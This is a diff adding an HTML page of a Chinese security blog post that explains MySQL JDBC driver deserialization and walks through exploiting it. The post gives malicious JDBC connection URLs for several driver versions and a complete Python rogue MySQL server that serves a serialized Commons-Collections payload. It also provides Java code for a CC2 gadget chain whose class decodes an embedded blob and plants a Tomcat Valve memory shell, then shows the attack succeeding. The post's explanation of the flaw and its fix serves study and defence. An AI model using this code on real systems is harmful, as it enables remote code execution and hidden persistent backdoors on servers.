@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>MySQL_JDBC反序列化 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="Gadget Chain 如下图所示，关键点是：ResultSetImpl#getObject()： POC # 8.0.11版本测试通过，8.0.22版本测试不通过 jdbc:mysql://xx.xx.xx.xx:3306/test?autoDeserialize=true&amp;amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;user=root&amp;amp;password=123456&amp;amp;serverTimezone=GMT # 6" /><meta name="keywords" content="Security, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.96.0 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/security/mysql_jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="MySQL_JDBC反序列化" />
+<meta property="og:description" content="Gadget Chain 如下图所示，关键点是：ResultSetImpl#getObject()： POC # 8.0.11版本测试通过，8.0.22版本测试不通过 jdbc:mysql://xx.xx.xx.xx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=123456&amp;serverTimezone=GMT # 6" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/security/mysql_jdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-06-15T17:07:36+08:00" />
+<meta property="article:modified_time" content="2021-06-15T17:07:36+08:00" />
+
+<meta itemprop="name" content="MySQL_JDBC反序列化">
+<meta itemprop="description" content="Gadget Chain 如下图所示，关键点是：ResultSetImpl#getObject()： POC # 8.0.11版本测试通过，8.0.22版本测试不通过 jdbc:mysql://xx.xx.xx.xx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=123456&amp;serverTimezone=GMT # 6"><meta itemprop="datePublished" content="2021-06-15T17:07:36+08:00" />
+<meta itemprop="dateModified" content="2021-06-15T17:07:36+08:00" />
+<meta itemprop="wordCount" content="1803">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL_JDBC反序列化"/>
+<meta name="twitter:description" content="Gadget Chain 如下图所示，关键点是：ResultSetImpl#getObject()： POC # 8.0.11版本测试通过，8.0.22版本测试不通过 jdbc:mysql://xx.xx.xx.xx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=123456&amp;serverTimezone=GMT # 6"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">MySQL_JDBC反序列化</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-15 </span>
+        <div class="post-category">
+            <a href="/categories/security/"> security </a>
+            </div>
+          <span class="more-meta"> 约 1803 字 </span>
+          <span class="more-meta"> 预计阅读 4 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#gadget-chain">Gadget Chain</a></li>
+        <li><a href="#poc">POC</a></li>
+        <li><a href="#关键点分析">关键点分析</a></li>
+        <li><a href="#攻击演示">攻击演示</a></li>
+        <li><a href="#参考连接">参考连接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="gadget-chain">Gadget Chain</h2>
+<p>如下图所示，关键点是：ResultSetImpl#getObject()：</p>
+<p><img src="/media/2021-06-15-01.png" alt="Gadget Chain"></p>
+<h2 id="poc">POC</h2>
+<pre><code># 8.0.11版本测试通过，8.0.22版本测试不通过
+jdbc:mysql://xx.xx.xx.xx:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=123456&amp;serverTimezone=GMT
+# 6.x(网传版本,未测试)
+jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+# &gt;=5.1.11(网传版本,未测试)
+jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
+# 5.x &lt;= 5.1.10，同上，但需要连接后执行查询。detectCustomCollations为触发点。(网传版本,未测试)
+# 5.1.29 - 5.1.40(网传版本,未测试)
+jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true
+# 5.1.28 - 5.1.19(网传版本,未测试)
+jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
+</code></pre>
+<p>使用如上POC进行数据库连接测试，还需要一个Mysql服务端，可以利用如下python2脚本开启一个虚拟的Mysql服务，可以发送恶意的反序列化字节码：</p>
+<pre><code># coding=utf-8
+import socket
+import binascii
+import os
+
+greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;
+response_ok_data=&quot;0700000200000002000000&quot;
+
+def receive_data(conn):
+    data = conn.recv(1024)
+    print(&quot;[*] Receiveing the package : {}&quot;.format(data))
+    return str(data).lower()
+
+def send_data(conn,data):
+    print(&quot;[*] Sending the package : {}&quot;.format(data))
+    conn.send(binascii.a2b_hex(data))
+
+def get_payload_content():
+    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload
+    file= r'payload'
+    if os.path.isfile(file):
+        with open(file, 'rb') as f:
+            payload_content = str(binascii.b2a_hex(f.read())).encode(&quot;utf-8&quot;)
+        print(&quot;open successs&quot;)
+
+    else:
+        print(&quot;open false&quot;)
+        #calc
+        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
+    return payload_content
+
+# 主要逻辑
+def run():
+
+    while 1:
+        conn, addr = sk.accept()
+        print(&quot;Connection come from {}:{}&quot;.format(addr[0],addr[1]))
+
+        # 1.先发送第一个 问候报文
+        send_data(conn,greeting_data)
+
+        while True:
+            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
+            receive_data(conn)
+            send_data(conn,response_ok_data)
+
+            #其他过程
+            data=receive_data(conn)
+            #查询一些配置信息,其中会发送自己的 版本号
+            if &quot;session.auto_increment_increment&quot; in data:
+                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
+                send_data(conn,_payload)
+                data=receive_data(conn)
+            elif &quot;show warnings&quot; in data:
+                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
+                send_data(conn, _payload)
+                data = receive_data(conn)
+            if &quot;set names&quot; in data:
+                send_data(conn, response_ok_data)
+                data = receive_data(conn)
+            if &quot;set character_set_results&quot; in data:
+                send_data(conn, response_ok_data)
+                data = receive_data(conn)
+            if &quot;show session status&quot; in data:
+                mysql_data = '0100000102'
+                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
+                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
+                # 为什么我加了EOF Packet 就无法正常运行呢？？
+                # 获取payload
+                payload_content=get_payload_content()
+                # 计算payload长度
+                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
+                payload_length_hex = payload_length[2:4] + payload_length[0:2]
+                # 计算数据包长度
+                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
+                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
+                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
+                mysql_data += str(payload_content)
+                mysql_data += '07000005fe000022000100'
+                send_data(conn, mysql_data)
+                data = receive_data(conn)
+            if &quot;show warnings&quot; in data:
+                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
+                send_data(conn, payload)
+            break
+</code></pre>
+<p>​
+if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:
+HOST =&lsquo;0.0.0.0&rsquo;
+PORT = 3307</p>
+<pre><code>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
+    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sk.bind((HOST, PORT))
+    sk.listen(1)
+
+    print(&quot;start fake mysql server listening on {}:{}&quot;.format(HOST,PORT))
+
+    run()
+</code></pre>
+<p><strong>对于目标不出网，可以直接先盲猜CC链反序列化，然后植入内存马即可。</strong></p>
+<h2 id="关键点分析">关键点分析</h2>
+<p>ResultSetImpl#getObject()中存在反序列化，如下图所示：</p>
+<p><img src="/media/2021-06-15-02.png" alt=""></p>
+<p>那么如何调用到ResultSetImpl#getObject()的呢？主要逻辑为：为JDBC连接设置一个ServerStatusDiffInterceptor过滤器，然后JDBC连接过程中会自动执行一些SQL语句，例如： <code>set autocommit=1</code> ,就会触发过滤器中的如下代码，从而调用到ResultSetImpl#getObject()：</p>
+<p><img src="/media/2021-06-15-03.png" alt=""></p>
+<p><img src="/media/2021-06-15-04.png" alt=""></p>
+<p>最终高版本中的修复，是将ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()中的代码换成了如下，不再调用ResultSetImpl#getObject()，而是调用ResultSetImpl#getString()，所以不能触发反序列化了：</p>
+<p><img src="/media/2021-06-15-05.png" alt=""></p>
+<h2 id="攻击演示">攻击演示</h2>
+<p>这里手工写一个CC2的利用链，效果为植入Tomcat Valve内存马(可以参考本人博客中的Tomcat Valve内存马)。首先写一个AbstractTranslet的超类：</p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class EvalTemp extends AbstractTranslet {
+    static {
+        try{
+            java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,new Class[] {byte[].class, int.class, int.class});
+            defineClass.setAccessible(true);
+            String evalBase64 = &quot;H4sIAAAAAAAAAI1WWXMTRxD+RtesVwsGGdvIXHHCIRvwhkBIkAgJmDOxDbGIiYEc4/VgLUi7YndlG8hF7oOc5DKpykseqMpbqlICQoXwxEP+SP4FpGclQMaisKs8R/dM99fd3/Tq39t/3QCwBb/oWIVBDUNJHMQhDS/rSGJYQ17HYbyiNiMajqj5VY5RDUc1HNNwXMNrOl7HG2p4U4fAGIelow3jGqSaT6hhQg2FJGyc1HEKRTWUdKyEk4SLMsdpDo8hsd127GAHQzTTM8IQ63fHJUPrgO3IoUppTHqHxViRJKkB1xLFEeHZal8XxoKC7TN0DuQD4YwLb7zfdQI5Hfgjojgpc2TddibdU3RyODPgehOmKAurIE1LBKJoO8K0XMeRVuB65rA8XZF+kHvkMb/sOr7MKbDc9glnZZqBHWWIu/7hM2WF9KSYFGZROBNmPvBsZ4KAxKzSOCFtO9ZMGbEdhvaaxnbNA065EpBSihIpmbpW01UCu2jmLUFgPBWcWwnoJOHwauAZ1s0zSgbNq0fC8OjU1GOmIpEn5UXBmTZ96U0WZWAWgqBs7qchXxPc9xJTXpSHR12474ESxbCACmqdGhTlsNAhV3yOgKPCMUlc5OjjmCLaMeh7pi1ZDmy6zzHNcYZh0aAMCu74IeGJkgykRxnU827Fs+ReW9Gmqyld+hRGA4+hm1Jb3uRs2+yRPwNncY4BBt7C25Rq1+9zyCrHOwbexTkD7+E8oZ6yHQPv4wNy/mCBqb5+gYaNBJZTdH1ymjBETIvjQwMf4WMDn+BTjs8MfI4vGBbPqbUCdYGuHN9p4Et8ZeBrfGPgW5ynZBj4Dhc5vjfwA3408BO6DfyMGY5LBtYhQ7xqGizD6mZFn1Q63wyP7BKKHGvmRSiGtfPjEBmcF3fI4PwoQ4+jybtplB68RxCGlbON1m01HDAmZHCPNwQiM/e99jR7wgmCLYpEtPbGGwfHTlL4uZ6js2lxxg8kQUwqX55bll5ApE0G7oA7Jb3+MO1LMk3daJTRQNgOOVrW6Ki/ILy8ypxjydDd4vu64YoT2CWyqZO/e5v2WQ7qYvViiZ1E1EymSadqvEHALen7uVmu6kKGheRqVjk677qb09+WZpoqVH81Kr7cLYt2yQ6Lse7hxXigM/KC8IeI6+FXhbIRc8JNC6E64tWMNQI6RKbqilwDcxrE1N2n1OKB+t4FQVjjJ4oV9cw5+ai5XkEemj2Ku9+m9EOV6KbP5CqovwiY6kg0Pk47k2bqRYj3XgH7I1Q/QWMiFC7Caqg+FR7AGqylmakegKi6zP5DjLTAzfVDG7KxjanINUQjyMbT8Vv4LRVLx6uIX8JMbGsilbgKnuVpfgttaV6FlmqpQp9BIro10Z6YQTrxN5Kj0ZSRH42lFuRHyUT+Mjrq0oVK2lqTZrWrWJTWqlhcRSrbch1to+mWK1iSaq+iI6un9So6Z5BU89LLiKdi2WQ6dg1pyk6yiq76uoplvVUsX7/hGlZEoeKOhnHvophBvzIiWEIRt6MVHZS4TkrXUoo6jSy68ByWo4QV1MVXUntdhV8pnb/TiT/Jwj+UMZWzs5SXblxED3oplxlcwHpsAKd7+7ARfdDoRJaS/yRayEYvNuEp6GSpA5vpXFLltJ5vtdqCp8Ma3MRWPEPYIriBZ7GNMMdxnezkqA6tFMV2uhsnfMAgEndooXHs4Hie4wWOnRy7OPoZ/QNdwxy7b6tP3m6OPRx7Sdt/hwJNzL1B5vaFlIhgPw7gRVq3RAgTCI3iw0shawb+B6kuAzUECgAA&quot;;
+            byte[] evalBytes = java.util.Base64.getDecoder().decode(evalBase64);
+            java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
+            java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
+            java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);
+            byte[] buffer = new byte[1024];
+            for (int i=-1;(i=gzipInputStream.read(buffer)) &gt;0;){
+                byteOutputStream.write(buffer,0,i);
+            }
+            byte[] bytes = byteOutputStream.toByteArray();
+            defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
+            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
+            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext)standardroot.getContext();
+            org.apache.catalina.valves.ValveBase evalValve=(org.apache.catalina.valves.ValveBase)Class.forName(&quot;StandardContextsValve&quot;).newInstance();
+            standardContext.getPipeline().addValve(evalValve);
+        }catch (Exception e){
+            System.out.println(e.getMessage());
+            e.printStackTrace();
+        }
+    }
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+}
+</code></pre>
+<p>然后CC2链走起，运行main函数生成反序列化后的恶意类，保存在E://jdbc.serial：</p>
+<pre><code>/**
+ * @author : p1n93r
+ * @date : 2021/5/31 15:07
+ */
+public class Payload1 {
+
+    public TemplatesImpl getTemplate() throws Exception{
+        InputStream in = Payload1.class.getClassLoader().getResourceAsStream(&quot;EvalTemp.class&quot;);
+        byte[] bytes = new byte[in.available()];
+        in.read(bytes);
+        // 得到恶意类的字节码
+        byte[] evalByte = bytes;
+        TemplatesImpl templates = TemplatesImpl.class.getConstructor(new Class[0]).newInstance();
+        Class&lt;? extends TemplatesImpl&gt; clazz = templates.getClass();
+        // 将恶意字节码填充到TemplatesImpl对象中
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates,new byte[][]{evalByte});
+
+        // 还需要设置TemplatesImpl对象的_name属性，否则不能顺利执行：TemplatesImpl#getTransletInstance()
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;p1n93r&quot;);
+        return templates;
+    }
+
+    public Object getObject() throws Exception {
+        final Object templates = this.getTemplate();
+        final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
+        queue.add(1);
+        queue.add(1);
+        Class&lt;? extends InvokerTransformer&gt; clazz = transformer.getClass();
+        Field iMethodName = clazz.getDeclaredField(&quot;iMethodName&quot;);
+        iMethodName.setAccessible(true);
+        iMethodName.set(transformer,&quot;newTransformer&quot;);
+        Class&lt;? extends PriorityQueue&gt; queueClazz = queue.getClass();
+        Field declaredField = queueClazz.getDeclaredField(&quot;queue&quot;);
+        declaredField.setAccessible(true);
+        Object[] queueArray = (Object[]) declaredField.get(queue);
+        queueArray[0] = templates;
+        queueArray[1] = 1;
+        return queue;
+    }
+
+    public static void main(final String[] args) throws Exception {
+        Payload1 createObjectPayload = new Payload1();
+        Object evalObject = createObjectPayload.getObject();
+        FileOutputStream fileOutputStream = new FileOutputStream(new File(&quot;E://jdbc.serial&quot;));
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(evalObject);
+        objectOutputStream.close();
+    }
+}
+</code></pre>
+<p>然后将jdbc.serial上传到VPS，再在同目录下开启前面的python2脚本，如下所示：</p>
+<p><img src="/media/2021-06-15-06.png" alt=""></p>
+<p>然后在含有漏洞的地方，填写如下信息：</p>
+<p><img src="/media/2021-06-15-07.png" alt=""></p>
+<p>请求Mysql成功，如下所示：</p>
+<p><img src="/media/2021-06-15-08.png" alt=""></p>
+<p>成功植入内存马(其实也可以直接反弹shell啥的，但是这台机器不出网，只能写内存马了)：</p>
+<p><img src="/media/2021-06-15-09.png" alt=""></p>
+<h2 id="参考连接">参考连接</h2>
+<ul>
+<li><a href="https://redteaming.net/pages/b62a2f/#exp">JDBC反序列化入门学习</a></li>
+<li><a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#8-x">MySQL JDBC反序列化漏洞</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-15
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/security/arthas%D1%A7%CF%B0/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Arthas学习</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/security/ognl_ssti%E6%80%BB%E7%BB%93/">
+            <span class="next-text nav-default">Ognl_SSTI总结</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
